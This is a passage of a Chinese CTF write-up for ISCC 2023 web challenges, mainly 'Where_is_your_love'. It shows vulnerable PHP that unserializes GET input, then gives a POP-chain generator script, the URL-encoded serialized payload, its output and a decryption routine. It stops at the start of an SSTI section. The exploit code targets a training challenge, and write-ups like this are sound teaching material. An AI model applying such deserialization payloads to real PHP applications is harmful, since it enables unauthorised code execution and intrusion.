alt="image-20230503103212443"></p><p>在 <code>/vue.global.js</code>中找到了flag</p><h4 id="ISCC疯狂购物节-1"><a href="#ISCC疯狂购物节-1" class="headerlink" title="ISCC疯狂购物节-1"></a>ISCC疯狂购物节-1</h4><h4 id="Where-is-your-love"><a href="#Where-is-your-love" class="headerlink" title="Where_is_your_love"></a>Where_is_your_love</h4><p><img src="https://s2.loli.net/2023/05/06/7T5Oniu9PpcBawd.png" alt="image-20230506170416621"></p><p>在html中发现三个php文件，我们访问：<code>LoveStory.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./xxxiscc.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">boy</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$like</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;能请你喝杯奶茶吗？&lt;br&gt;&quot;</span>;<br>        @<span class="hljs-variable language_">$this</span>-&gt;like-&gt;<span class="hljs-title function_ invoke__">make_friends</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;拱火大法好&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;like-&gt;<span class="hljs-keyword">string</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">girl</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$boyname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我害羞羞&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;boyname-&gt;name);  <br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$string</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span> = <span class="hljs-variable">$string</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$val</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;僚机上线&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;僚机不懈努力&lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$var</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable">$var</span>[<span class="hljs-variable">$name</span>]();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">love_story</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">love</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;爱情萌芽&lt;br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function(<span class="hljs-variable">$make</span>, <span class="hljs-variable">$colo</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;坠入爱河，给你爱的密码&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$make</span>[<span class="hljs-number">0</span>] === <span class="hljs-string">&quot;girl_and_boy&quot;</span> &amp;&amp; <span class="hljs-variable">$colo</span> === <span class="hljs-string">&quot;fall_in_love&quot;</span>) &#123;<br>                <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;iscc&quot;</span>])) &#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;iscc&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这是一个反序列化pop链构造，突破点在<code>love_story类</code>  </p><p>我们先好好分析love()方法：</p><p>首先需要知道<code>array_walk()</code> </p><blockquote><p><code>array_walk()</code> 函数对数组中的每个元素应用回调函数。如果成功则返回 TRUE，否则返回 FALSE。</p><p>典型情况下 <em>myfunction</em> 接受两个参数。<em>array</em> <strong>参数的值作为第一个</strong>，<strong>键名作为第二个</strong>。如果提供了可选参数 <em>userdata</em> ，将被作为第三个参数传递给回调函数。</p></blockquote><p>例如：</p><p><img src="https://s2.loli.net/2023/05/06/W4Xm36SdQbG25vj.png" alt="image-20230506171038419"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">love_story</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">love</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;爱情萌芽&lt;br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function(<span class="hljs-variable">$make</span>, <span class="hljs-variable">$colo</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;坠入爱河，给你爱的密码&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$make</span>[<span class="hljs-number">0</span>] === <span class="hljs-string">&quot;girl_and_boy&quot;</span> &amp;&amp; <span class="hljs-variable">$colo</span> === <span class="hljs-string">&quot;fall_in_love&quot;</span>) &#123;<br>                <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>于是，<code>array_walk($this, function($make, $colo)</code>的意思就是</p><p>当前对象的属性中选择一个属性名为：<code>fall_in_love</code>并且值为一个数组，数组的第0个元素值为：<code>girl_and_boy</code></p><p>但是我们如何才能调用<code>love方法</code>呢？</p><p>我们看到了<code>helper</code>类的 <code>__get()</code>方法，当调用对象不存在的属性会自动调用该方法，并且属性名传参给 <code>$name</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;僚机不懈努力&lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$var</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable">$var</span>[<span class="hljs-variable">$name</span>]();<br>    &#125;<br></code></pre></td></tr></table></figure><p>我们重点关注：<code>$var[$name](); </code> </p><p>如果变为： <code>array(new love_story(),&quot;love&quot;)()</code>,意思是调用love_story类中名为：<code>love</code>的函数：</p><p><img src="https://s2.loli.net/2023/05/06/34maPxbuDQ52GY1.png" alt="image-20230506172451322"></p><p>如何做到呢？</p><p>我们先关注一下helper类中的私有变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$string</span>;<br></code></pre></td></tr></table></figure><p>然后分析：boy类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;拱火大法好&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;like-&gt;<span class="hljs-keyword">string</span>;  <span class="hljs-comment"># 如果$this-&gt;like是helper对象</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>这个方法会触发 helper类的 <code>__get()</code>方法，并且方法中<code>形参 $name=string</code></p><p>这样的话，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123; <span class="hljs-comment"># $name=&quot;string&quot;</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;僚机不懈努力&lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$var</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span>;   <span class="hljs-comment"># $this-&gt;string</span><br>        <span class="hljs-variable">$var</span>[<span class="hljs-variable">$name</span>]();<br>    &#125;<br></code></pre></td></tr></table></figure><p>如果 <code>$var = $this-&gt;string=array(&#39;string&#39;=&gt;array($love,&#39;love&#39;))</code></p><p>那么：<code>$var[$name]=$var[&quot;string&quot;] =  array($love,&#39;love&#39;)</code></p><p>这样  <code>array($love,&#39;love&#39;)()</code>就回调了love函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">boy</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$like</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$li</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;like=<span class="hljs-variable">$li</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;能请你喝杯奶茶吗？&lt;br&gt;&quot;</span>;<br>        @<span class="hljs-variable language_">$this</span>-&gt;like-&gt;<span class="hljs-title function_ invoke__">make_friends</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;拱火大法好&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;like-&gt;<span class="hljs-keyword">string</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">girl</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$boyname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$boy</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;boyname=<span class="hljs-variable">$boy</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我害羞羞&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;boyname-&gt;name);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$string</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$string</span>,<span class="hljs-variable">$na</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span> = <span class="hljs-variable">$string</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$na</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$val</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;僚机上线&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;僚机不懈努力&lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$var</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable">$var</span>[<span class="hljs-variable">$name</span>]();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">love_story</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fall_in_love</span>=[<span class="hljs-string">&quot;girl_and_boy&quot;</span>];<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">love</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;爱情萌芽&lt;br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function(<span class="hljs-variable">$make</span>, <span class="hljs-variable">$colo</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;坠入爱河，给你爱的密码&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$make</span>[<span class="hljs-number">0</span>] === <span class="hljs-string">&quot;girl_and_boy&quot;</span> &amp;&amp; <span class="hljs-variable">$colo</span> === <span class="hljs-string">&quot;fall_in_love&quot;</span>) &#123;<br>                <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$love</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">love_story</span>();<br><br><span class="hljs-variable">$helper2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;string&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$love</span>,<span class="hljs-string">&#x27;love&#x27;</span>)),<span class="hljs-string">&#x27;1&#x27;</span>);<br><span class="hljs-variable">$boy2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">boy</span>(<span class="hljs-variable">$helper2</span>);<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-variable">$boy2</span>);<br><span class="hljs-variable">$g</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">girl</span>(<span class="hljs-variable">$h</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">boy</span>(<span class="hljs-variable">$g</span>);<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br><br><br>O%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>boy%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>like%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>girl%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>girl%<span class="hljs-number">00</span>boyname%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>helper%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>helper%<span class="hljs-number">00</span>name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>boy%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>like%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>helper%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>helper%<span class="hljs-number">00</span>name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">221</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>helper%<span class="hljs-number">00</span><span class="hljs-keyword">string</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span><span class="hljs-keyword">string</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>love_story%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>fall_in_love%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>girl_and_boy%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Di%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>love%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>helper%<span class="hljs-number">00</span><span class="hljs-keyword">string</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">221</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>get传参：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">能请你喝杯奶茶吗？<br>我害羞羞<br>僚机上线<br>拱火大法好<br>僚机不懈努力<br>爱情萌芽<br>坠入爱河，给你爱的密码<br>e35a31342f241b3f17081ae75e042b5f155e38163d285826e41936125b5a075910e<span class="hljs-number">13e3e3404</span><br></code></pre></td></tr></table></figure><p>得到一个密码</p><p>然后我们分析之前得到的两个文件</p><p>进行解密（不会解）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">b<span class="hljs-string">&#x27;\x02\xa8\xbe$\x1d~\xc2\x18U*\xf2\x03i\x00&lt;?php\r\nfunction enc($data)&#123;\r\n    $str=&quot;&quot;;\r\n    $a=strrev(str_rot13($data));\r\n    for($i=0;$i&lt;strlen($a);$i++)&#123;\r\n        $b=ord($a[$i])+10;\r\n        $c=$b^100;\r\n        $e=sprintf(&quot;%02x&quot;,$c);\r\n        $str.=$e;\r\n    &#125;\r\n    return $str;\r\n&#125;\r\n?&gt;&#x27;</span><br></code></pre></td></tr></table></figure><p>然后叫chatgpt解密：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dec</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>); <span class="hljs-variable">$i</span> += <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$i</span>, <span class="hljs-number">2</span>));<br>        <span class="hljs-variable">$b</span> = (<span class="hljs-variable">$c</span> ^ <span class="hljs-number">100</span>) - <span class="hljs-number">10</span>;<br>        <span class="hljs-variable">$str</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$b</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$str</span>));<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">dec</span>(<span class="hljs-string">&quot;e35a31342f241b3f17081ae75e042b5f155e38163d285826e41936125b5a075910e13e3e3404&quot;</span>);<br></code></pre></td></tr></table></figure><p>解密密文就是之前获得的密码</p><p><img src="https://s2.loli.net/2023/05/06/ATb3SLN97oXU2tf.png" alt="image-20230506220655514"></p><h4 id="ChatGGG"><a href="#ChatGGG" class="headerlink" title="ChatGGG"></a>ChatGGG</h4><p>SSTI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 